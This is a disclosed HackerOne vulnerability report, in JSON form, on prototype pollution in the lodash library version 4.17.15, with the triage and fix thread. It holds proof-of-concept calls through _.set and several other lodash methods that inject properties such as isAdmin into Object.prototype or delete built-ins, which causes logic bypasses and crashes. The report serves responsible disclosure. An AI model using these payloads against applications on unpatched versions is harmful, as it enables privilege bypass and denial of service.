{"id":841380,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDEzODA=","url":"https://hackerone.com/reports/841380","title":"Prototype pollution attack (lodash)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-04-06T12:25:52.689Z","submitted_at":"2020-04-06T12:25:52.689Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"macasun","url":"/macasun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-25T09:26:13.115Z","bug_reporter_agreed_on_going_public_at":"2020-08-25T09:26:13.071Z","team_member_agreed_on_going_public_at":"2020-08-24T10:59:30.038Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a prototype pollution vulnerability in lodash.\nIt allows an attacker to inject properties on `Object.prototype`.\n\n# Module\n\nmodule name: lodash\nversion: 4.17.15\nnpm page: https://www.npmjs.com/package/lodash\n\n## Module Description\n\nA modern JavaScript utility library delivering modularity, performance, \u0026 extras. \n\n## Module Stats\n\n28M downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\n`_.set` function can be used to modify `Object.prototype`. If the attacker can control the value of `path`, he can add or modify existing property on all objects.\n\n## Steps To Reproduce:\n\n```js\nconst _ = require('lodash');\n\n_.set({}, 'constructor.prototype.isAdmin', true);\nconsole.log({}.isAdmin); // true\n\n_.set({}, 'constructor.prototype.toString', null);\nconsole.log({}.toString()); // crash\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n## Impact\n\nBusiness logic errors, Denial of service.","vulnerability_information_html":"\u003cp\u003eI would like to report a prototype pollution vulnerability in lodash.\u003cbr\u003e\nIt allows an attacker to inject properties on \u003ccode\u003eObject.prototype\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003emodule name: lodash\u003cbr\u003e\nversion: 4.17.15\u003cbr\u003e\nnpm page: \u003ca title=\"https://www.npmjs.com/package/lodash\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Flodash\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/lodash\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eA modern JavaScript utility library delivering modularity, performance, \u0026amp; extras. \u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e28M downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003e_.set\u003c/code\u003e function can be used to modify \u003ccode\u003eObject.prototype\u003c/code\u003e. If the attacker can control the value of \u003ccode\u003epath\u003c/code\u003e, he can add or modify existing property on all objects.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elodash\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003econstructor.prototype.isAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisAdmin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003econstructor.prototype.toString\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e \u003cspan class=\"c1\"\u003e// crash\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBusiness logic errors, Denial of service.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-09-23T10:59:30.133Z","allow_singular_disclosure_after":-8366455.952783943,"singular_disclosure_allowed":true,"vote_count":1,"voters":["lustigo"],"severity":{"rating":"medium","score":6.1,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":5914,"asset_type":"SOURCE_CODE","asset_identifier":"lodash","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7567912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alexandermac05,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@turtle_shell","markdown_message":"\u003cp\u003eHi \u003ca href=\"/alexandermac05\"\u003e@alexandermac05\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-07T06:54:06.563Z","updated_at":"2020-04-07T06:54:06.563Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7567931,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @alexandermac05,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@turtle_shell","markdown_message":"\u003cp\u003eHello \u003ca href=\"/alexandermac05\"\u003e@alexandermac05\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-07T06:57:49.943Z","updated_at":"2020-04-07T06:57:49.943Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7614068,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Found some more methods allowing to change `constructor.prototype`:\n\n```\n_.setWith({}, 'constructor.prototype._setWith', true);\nconsole.log({}._setWith); // true\n\n_.omit({}, ['constructor.prototype.isPrototypeOf']);\nconsole.log({}.isPrototypeOf); // undefined\n\n_.update({}, 'constructor.prototype._update', () =\u003e true);\nconsole.log({}._update); // true\n\n_.updateWith({}, 'constructor.prototype._updateWith', () =\u003e true);\nconsole.log({}._updateWith); // true\n\n_.unset({}, 'constructor.prototype.hasOwnProperty');\nconsole.log({}.hasOwnProperty); // undefined\n```","markdown_message":"\u003cp\u003eFound some more methods allowing to change \u003ccode\u003econstructor.prototype\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e_.setWith({}, \u0026#39;constructor.prototype._setWith\u0026#39;, true);\nconsole.log({}._setWith); // true\n\n_.omit({}, [\u0026#39;constructor.prototype.isPrototypeOf\u0026#39;]);\nconsole.log({}.isPrototypeOf); // undefined\n\n_.update({}, \u0026#39;constructor.prototype._update\u0026#39;, () =\u0026gt; true);\nconsole.log({}._update); // true\n\n_.updateWith({}, \u0026#39;constructor.prototype._updateWith\u0026#39;, () =\u0026gt; true);\nconsole.log({}._updateWith); // true\n\n_.unset({}, \u0026#39;constructor.prototype.hasOwnProperty\u0026#39;);\nconsole.log({}.hasOwnProperty); // undefined\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-04-10T10:29:42.922Z","updated_at":"2020-04-10T10:29:42.922Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8542388,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all, any updates?","markdown_message":"\u003cp\u003eHi all, any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-08T19:30:10.268Z","updated_at":"2020-07-08T19:30:10.268Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8649517,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@macasun I can no longer reproduce this with 4.17.19. Can you verify this vulnerability has been properly fixed?","markdown_message":"\u003cp\u003e\u003ca href=\"/macasun\"\u003e@macasun\u003c/a\u003e I can no longer reproduce this with 4.17.19. Can you verify this vulnerability has been properly fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T08:34:41.291Z","updated_at":"2020-07-20T08:34:41.291Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8650914,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marcinhoppe Yes, I confirm that the issue is no longer reproducible in v4.17.19.\nThe report can be closed are resolved.","markdown_message":"\u003cp\u003e\u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e Yes, I confirm that the issue is no longer reproducible in v4.17.19.\u003cbr\u003e\nThe report can be closed are resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T10:41:32.418Z","updated_at":"2020-07-20T10:41:32.418Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8966752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could you disclosure the report? The issue was fixed more than month ago.","markdown_message":"\u003cp\u003eCould you disclosure the report? The issue was fixed more than month ago.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-18T10:02:20.456Z","updated_at":"2020-08-18T10:02:20.456Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9021193,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@macasun Absolutely, I will disclose it now.","markdown_message":"\u003cp\u003e\u003ca href=\"/macasun\"\u003e@macasun\u003c/a\u003e Absolutely, I will disclose it now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T10:59:23.312Z","updated_at":"2020-08-24T10:59:23.312Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"macasun","url":"/macasun"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9021200,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-24T10:59:30.064Z","updated_at":"2020-08-24T10:59:30.064Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9032180,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-25T09:26:13.093Z","updated_at":"2020-08-25T09:26:13.093Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9032181,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-25T09:26:13.141Z","updated_at":"2020-08-25T09:26:13.141Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}